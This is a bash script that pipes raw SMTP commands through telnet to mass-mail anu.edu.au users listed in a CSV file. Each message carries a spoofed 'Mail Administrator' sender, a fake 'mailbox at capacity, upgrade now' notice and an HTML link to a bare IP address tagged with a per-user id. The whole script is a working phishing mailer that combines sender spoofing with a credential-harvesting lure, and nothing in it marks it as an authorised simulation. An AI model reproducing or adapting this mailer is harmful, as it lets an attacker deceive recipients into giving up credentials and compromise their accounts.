#!/bin/bash

(
sleep 2
echo helo usr
sleep 2
IFS=","
while read col1 col2
	do
	echo "MAIL FROM:MailAdministrator<mailadministrator@anu.edu.au>"
	sleep 2
	echo "RCPT TO:${col1}@anu.edu.au"
	sleep 2
	echo Data
	sleep 2
	echo "From: Mail Administrator <mailadministrator@anu.edu.au>"
	sleep 2
	echo "To: ${col1}@anu.edu.au;"
	sleep 2
	echo "Subject: Verify Your Mailbox and Upgrade Quota"
	sleep 2
	echo "Mime-Version: 1.0;"
	sleep 2
	echo "Content-Type: text/html; charset="ISO-8859-1";"
	sleep 2
	echo "Content-Transfer-Encoding: 7bit;"
	sleep 2
	echo "Your mailbox is currently at capacity and you are eligible for a free upgrade."
	echo "<html>"
	echo "<body>"
	echo "<p><a href=\"http://150.203.139.148/psp/sscsprod/ISIS.php?id=${col2}\">Upgrade your capacity now.</a></p>"
	echo "</body>"
	echo "</html>"
	sleep 2
	echo "."
	sleep 2
done < userlist.csv
)|telnet smtphost.anu.edu.au 25 
